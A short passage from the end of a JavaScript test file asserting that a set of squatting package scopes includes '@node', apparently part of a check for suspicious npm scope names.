    expect(SQUATTING_SCOPES.has('@node')).toBe(true)
  })
})
